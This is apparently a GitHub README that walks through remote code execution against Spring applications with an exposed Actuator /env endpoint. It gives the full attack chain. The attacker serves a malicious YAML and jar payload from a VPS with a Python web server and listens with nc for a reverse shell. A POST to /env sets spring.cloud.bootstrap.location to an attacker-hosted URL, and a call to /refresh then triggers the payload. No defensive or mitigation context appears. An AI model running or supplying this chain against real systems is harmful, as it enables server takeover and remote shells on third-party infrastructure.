# spring-rce
spring-rce

You can see that the main interface can log in without authorization. Of course, not logging in may also trigger this vulnerability
![image](https://user-images.githubusercontent.com/83150001/115980614-b2fa8b00-a5c0-11eb-9d62-edd3a1ed8d1c.png)

Add / env to the path of the website to see the error information in the log

![image](https://user-images.githubusercontent.com/83150001/115980640-d8879480-a5c0-11eb-87eb-1123b2387d8f.png)


Environmental preparation:
Open the web service on VPS and add yaml- payload.yml , and yaml- payload.jar Upload to the server, as shown in the figure below.

python3 -m http.server 8088
![image](https://user-images.githubusercontent.com/83150001/115980675-23091100-a5c1-11eb-95df-4edeadb81b06.png)


![image](https://user-images.githubusercontent.com/83150001/115980673-1f758a00-a5c1-11eb-9ad8-c19a1a391a2f.png)

NC monitor rebound port.

![image](https://user-images.githubusercontent.com/83150001/115980741-90b53d00-a5c1-11eb-922b-40de92a6cc53.png)

The file payload of YML is as follows:

![image](https://user-images.githubusercontent.com/83150001/115980759-b3dfec80-a5c1-11eb-8cf7-2641ab86d7b6.png)

yaml-payload.jar You need to download and modify the compilation
Download address：
https://github.com/artsploit/yaml-payload


Start using the following: modify the request

Send request package:

POST /env 
spring.cloud.bootstrap.location=http://attackerIP:port/yaml-payload.yml
![image](https://user-images.githubusercontent.com/83150001/115980828-43859b00-a5c2-11eb-9b85-276091a0ae9c.png)

Request / refresh interface, refresh interface configuration, and successfully rebound the session to VPS.
![image](https://user-images.githubusercontent.com/83150001/115980857-7891ed80-a5c2-11eb-8bb5-a0704518c5f9.png)





